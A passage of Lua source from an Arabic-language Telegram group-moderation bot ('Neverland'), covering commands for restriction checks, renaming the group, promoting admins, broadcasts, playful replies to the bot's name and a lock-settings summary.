if text == "كشف القيود" and Owner(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if database:sismember(bot_id.."Neverland:Muted:User"..msg.chat_id_,result.sender_user_id_) then
Muted = "مكتوم"
else
Muted = "غير مكتوم"
end
if database:sismember(bot_id.."Neverland:Ban:User"..msg.chat_id_,result.sender_user_id_) then
Ban = "محظور"
else
Ban = "غير محظور"
end
if database:sismember(bot_id.."Neverland:GBan:User",result.sender_user_id_) then
GBan = "محظور عام"
else
GBan = "غير محظور عام"
end
Textt = "✦┇الحظر العام ↜ "..GBan.."\n✦┇الحظر ↜ "..Ban.."\n✦┇الكتم ↜ "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
end

if text and text:match("^ضع اسم (.*)") and Owner(msg) or text and text:match("^وضع اسم (.*)") and Owner(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Name = text:match("^ضع اسم (.*)") or text:match("^وضع اسم (.*)") 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"✦┇ليست لدي صلاحية تغير اسم المجموعه")  
else
send(msg.chat_id_,msg.id_,"↜ ??تم تغيير اسم المجموعه الى {["..Name.."]}")  
end
end,nil) 
end

if text ==("رفع الادمنيه") and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Neverland:Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"✦┇لا توجد ادمنية ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_,"✦┇تمت ترقية { "..num2.." } من ادمنية المجموعه") 
end
end,nil)   
end
if text == "المالك" or text == "المنشئ" then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," *حساب✦┇ المنشئ محذوف*")
return false  
end
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = owner_id,offset_ = 0,limit_ = 1},function(arg,getpro) 
if getpro.photos_[0] then
Text = "*✦┇ Owner Name ↬ * ["..b.first_name_.."](T.me/"..b.username_..")\n*✦┇ Owner User ↬* [@"..b.username_.."]\n*✦┇ Owner id ↬* ["..b.id_.."]"
keyboard = {}
keyboard.inline_keyboard = {{{text = ''..b.first_name_..'', url = "https://t.me/"..b.username_..""}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
send(msg.chat_id_, msg.id_,Name,1, 'md')
end
end,nil)   
end,nil)   
end
end
end,nil)  
end
if text == "رفع المالك" or text == "رفع المنشئ" and DevBot(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"✦┇حساب المالك محذوف")
return false  
end
local UserName = (b.username_ or "TEAM_Neverland")
send(msg.chat_id_, msg.id_,"✦┇تم ترقية مالك المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
database:sadd(bot_id.."Basic:Constructor"..msg.chat_id_,b.id_)
end,nil)   
end,nil)   
end

if text == "غادر" then 
if DevBot(msg) then 
_key = {
{{text="تأكيد الامر",callback_data="OKKADR"..msg.sender_user_id_},{text="الغاء الامر",callback_data="noKikedMe"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_," *✦┇قم بتأكيد العمليه الان*",_key,msg.id_)
return false
end
end
if text == "تفعيل المغادره" and DevNeverland(msg) then   
database:del(bot_id.."Neverland:Left:Bot"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✦┇تم تفعيل مغادرة البوت") 
return false 
end
if text == "تعطيل المغادره" and DevNeverland(msg) then  
database:set(bot_id.."Neverland:Left:Bot"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "✦┇تم تعطيل مغادرة البوت") 
return false 
end
if text == (database:get(bot_id.."Neverland:Name:Bot") or "نيفرلاند") then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
Namebot = (database:get(bot_id.."Neverland:Name:Bot") or "نيفرلاند")
local namebot = {
'لابسك لتلح',
'لاتوصخ اسمي',
'هاقلبي؟ كول',
'دعبل يمعود',
'ۿۧهلا ؏ـمࢪي .',
'اكلك تحبني ؟ وتصيحني هلكد',
'ۿۧاا ڪـلبي .',
'انا '..Namebot..' موو بوت ɵ̷̥̥᷄ˬɵ̷̥̥᷅',
'مو كافي تصيح بوت ترا ورب اغادر',
'عيونه',
'ۿۧها ححب  .',
'اهو شتريد ؟'
}
name = math.random(#namebot)
send(msg.chat_id_, msg.id_, namebot[name]) 
return false 
end

if text == "بوت" then
Namebot = (database:get(bot_id.."Neverland:Name:Bot") or "نيفرلاند")
local namebot = {
"لتخليني ارجع لحركاتي لقديمه وردا ترا اسمي "..Namebot,
"باوع لك خليني احبك وصيحلي باسمي "..Namebot,
"اسممممممممممييي "..Namebot,
'ۿۧهلا ؏ـمࢪي .',
'اكلك تحبني ؟ وتصيحني هلكد',
'ۿۧاا ڪـلبي .',
'انا '..Namebot..' موو بوت ɵ̷̥̥᷄ˬɵ̷̥̥᷅',
'صيحلي بأسمي '..Namebot..' وأرد عليك',
'مو كافي تصيح بوت ترا ورب اغادر',
'عيونه',
'ۿۧها ححب  .',
'راح نموت بكورونا ونته بعدك تصيح بوت'
}
name = math.random(#namebot)
send(msg.chat_id_, msg.id_, namebot[name]) 
return false 
end
if text == "تغير اسم البوت" or text == "تغيير اسم البوت" or text == "حذف اسم البوت" then 
if DevNeverland(msg) then
database:setex(bot_id.."Neverland:Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي الاسم الان ")  
end
return false
end
if text ==("مسح المطرودين") and Addictive(msg) then    
local function delbans(extra, result)  
if not msg.can_be_deleted_ == true then  
send(msg.chat_id_, msg.id_, "✦┇يرجى ترقيتي ادمن هنا") 
return false
end  
local num = 0 
for k,y in pairs(result.members_) do 
num = num + 1  
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil)  
end  
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الحظر عن *~ "..num.." ~* اشخاص ") 
end    
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي سواء ~ { ملصق, متحركه, صوره, رساله }\n✦┇للخروج ارسل الغاء ") 
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي سواء ~ { ملصق, متحركه, صوره, رساله }\n✦┇للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي سواء ~ { ملصق, متحركه, صوره, رساله }\n✦┇للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and DevBot(msg) then 
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and DevBot(msg) then 
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي التوجيه الان") 
return false
end 

if text == "تفعيل الاذاعه" and DevNeverland(msg) then  
database:del(bot_id.."Neverland:Status:Bc") 
send(msg.chat_id_, msg.id_,"\n✦┇تم تفعيل الاذاعه " ) 
return false
end 
if text == "تعطيل الاذاعه" and DevNeverland(msg) then  
database:set(bot_id.."Neverland:Status:Bc",true) 
send(msg.chat_id_, msg.id_,"\n✦┇تم تعطيل الاذاعه") 
return false
end 

if text == "الاعدادات" and Addictive(msg) then    
if database:get(bot_id.."Neverland:lockpin"..msg.chat_id_) then    
lock_pin = "✓"
else 
lock_pin = "✘"    
end
if database:get(bot_id.."Neverland:Lock:tagservr"..msg.chat_id_) then    
lock_tagservr = "✓"
else 
lock_tagservr = "✘"    
end
if database:get(bot_id.."Neverland:Lock:text"..msg.chat_id_) then    
lock_text = "✓"
else 
lock_text = "✘"    
end
if database:get(bot_id.."Neverland:Lock:AddMempar"..msg.chat_id_) == "kick" then
lock_add = "✓"
else 
lock_add = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:Join"..msg.chat_id_) == "kick" then
lock_join = "✓"
else 
lock_join = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:edit"..msg.chat_id_) then    
lock_edit = "✓"
else 
lock_edit = "✘"    
end
if database:get(bot_id.."Neverland:Get:Welcome:Group"..msg.chat_id_) then
welcome = "✓"
else 
welcome = "✘"    
end
if database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = "بالطرد"     
elseif database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = "بالتقيد"     
elseif database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = "بالكتم"           
elseif database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = "بالمسح"           
else     
flood = "✘"     
end
if database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "del" then
lock_photo = "✓" 
elseif database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = "بالتقيد"   
elseif database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = "بالطرد"   
else
lock_photo = "✘"   
end    
if database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "del" then
lock_phon = "✓" 
elseif database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = "بالطرد"    
else
lock_phon = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "del" then
lock_links = "✓"
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "ked" then
lock_links = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "ktm" then
lock_links = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "kick" then
lock_links = "بالطرد"    
else
lock_links = "✘"    
end
if database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = "✓"
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = "بالكتم"   
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = "بالطرد"    
else
lock_cmds = "✘"    
end
if database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "del" then
lock_user = "✓"
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "ked" then
lock_user = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "ktm" then
lock_user = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "kick" then
lock_user = "بالطرد"    
else
lock_user = "✘"    
end
if database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = "✓"
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = "بالطرد"    
else
lock_hash = "✘"    
end
if database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "del" then
lock_muse = "✓"
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = "بالطرد"    
else
lock_muse = "✘"    
end 
if database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "del" then
lock_ved = "✓"
elseif database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = "بالطرد"    
else
lock_ved = "✘"    
end
if database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "del" then
lock_gif = "✓"
elseif database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = "بالطرد"    
else
lock_gif = "✘"    
end
if database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = "✓"
elseif database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = "بالتقيد "    
elseif database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = "بالكتم "    
elseif database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = "بالطرد"    
else
lock_ste = "✘"    
end
if database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "del" then
lock_geam = "✓"
elseif database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = "بالطرد"    
else
lock_geam = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "del" then
lock_vico = "✓"
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = "بالطرد"    
else
lock_vico = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = "✓"
elseif database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = "بالتقيد"
elseif database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = "بالطرد"
else
lock_inlin = "✘"
end
if database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "del" then
lock_fwd = "✓"
elseif database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = "بالطرد"    
else
lock_fwd = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "del" then
lock_file = "✓"
elseif database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "ked" then 
lock_file = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "kick" then 
lock_file = "بالطرد"    
else
lock_file = "✘"    
end    
if database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = "✓"
elseif database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = "بالطرد"    
else
lock_self = "✘"    
end
if database:get(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_) == "del" then
lock_bots = "✓"
elseif database:get(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif database:get(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "✘"    
end
if database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = "✓"
elseif database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = "بالطرد"    
else
lock_mark = "✘"    
end
if database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = "✓"
elseif database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = "بالتقيد"    
elseif database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = "بالكتم"    
elseif database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = "بالطرد"    
else
lock_spam = "✘"    
end        
if not database:get(bot_id.."Neverland:Reply:Manager"..msg.chat_id_) then
rdmder = "✓"
else
rdmder = "✘"
end
if not database:get(bot_id.."Neverland:Reply:Sudo"..msg.chat_id_) then
rdsudo = "✓"
else
rdsudo = "✘"
end
if not database:get(bot_id.."Neverland:Lock:ID:Bot"..msg.chat_id_)  then
idgp = "✓"
else
idgp = "✘"
end
if not database:get(bot_id.."Neverland:Lock:ID:Bot:Photo"..msg.chat_id_) then
idph = "✓"
else
idph = "✘"
end
if not database:get(bot_id.."Neverland:Lock:kick"..msg.chat_id_)  then
setadd = "✓"
else
setadd = "✘"
end
if not database:get(bot_id.."Neverland:Lock:Add:Bot"..msg.chat_id_)  then
banm = "✓"
else
banm = "✘"
end
if not database:get(bot_id.."Neverland:Kick:Me"..msg.chat_id_) then
kickme = "✓"
else
kickme = "✘"
end
Num_Flood = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
"*\n✦┇ااعدادات المجموعه "..
"\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉"..
"\n✦┇علامة ال {✓} تعني مفعل"..
"\n✦┇علامة ال {✘} تعني معطل"..
"\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉"..
"\n✦┇الروابط ↜ "..lock_links..
"\n".."✦┇المعرفات ↜ "..lock_user..
"\n".."✦┇التاك ↜ "..lock_hash..
"\n".."✦┇البوتات ↜ "..lock_bots..
"\n".."✦┇التوجيه ↜ "..lock_fwd..
"\n".."✦┇التثبيت ↜ "..lock_pin..
"\n".."✦┇الاشعارات ↜ "..lock_tagservr..
"\n".."✦┇الماركدون ↜ "..lock_mark..
"\n".."✦┇التعديل ↜ "..lock_edit..
"\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉"..
"\n".."✦┇الكلايش ↜ "..lock_spam..
"\n".."✦┇الكيبورد ↜ "..lock_inlin..
"\n".."✦┇الاغاني ↜ "..lock_vico..
"\n".."✦┇المتحركه ↜ "..lock_gif..
"\n".."✦┇الملفات ↜ "..lock_file..
"\n".."✦┇الدردشه ↜ "..lock_text..
"\n".."✦┇الفيديو ↜ "..lock_ved..
"\n".."✦┇الصور ↜ "..lock_photo..
"\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉"..
"\n".."✦┇الصوت ↜ "..lock_muse..
"\n".."✦┇الملصقات ↜ "..lock_ste..
"\n".."✦┇الجهات ↜ "..lock_phon..
"\n".."✦┇الدخول ↜ "..lock_join..
"\n".."✦┇الاضافه ↜ "..lock_add..
"\n".."✦┇السيلفي ↜ "..lock_self..
"\n".."✦┇الالعاب ↜ "..lock_geam..
"\n".."✦┇التكرار ↜ "..flood..
"\n".."✦┇الترحيب ↜ "..welcome..
"\n".."✦┇عدد التكرار ↜ "..Num_Flood..
"\n\n.*"
send(msg.chat_id_, msg.id_,text)     
end    
if text == "تعطيل اوامر التحشيش" and Owner(msg) then      
database:set(bot_id.."Fun_Bots"..msg.chat_id_,"true")
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تعطيل اوامر التحشيش')
return false
end
if text == "تفعيل اوامر التحشيش" and Owner(msg) then      
database:del(bot_id.."Fun_Bots"..msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تفعيل اوامر التحشيش')
return false
end
if text == "تفعيل صورتي" or text == 'تفعيل الصوره' and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'✦┇عـليك الاشـتࢪاك في قنـاة البـوت اولآ . \n ✦┇قنـاة البـوت ↜  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end      
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم تفعيل الصوره*") 
return false
end
if text == "تعطيل الصوره" or text == 'تعطيل صورتي' and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'✦┇عـليك الاشـتࢪاك في قنـاة البـوت اولآ . \n ✦┇قنـاة البـوت ↜  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end        
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم تعطيل الصوره*") 
return false
end
if text == "صورتي"  then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
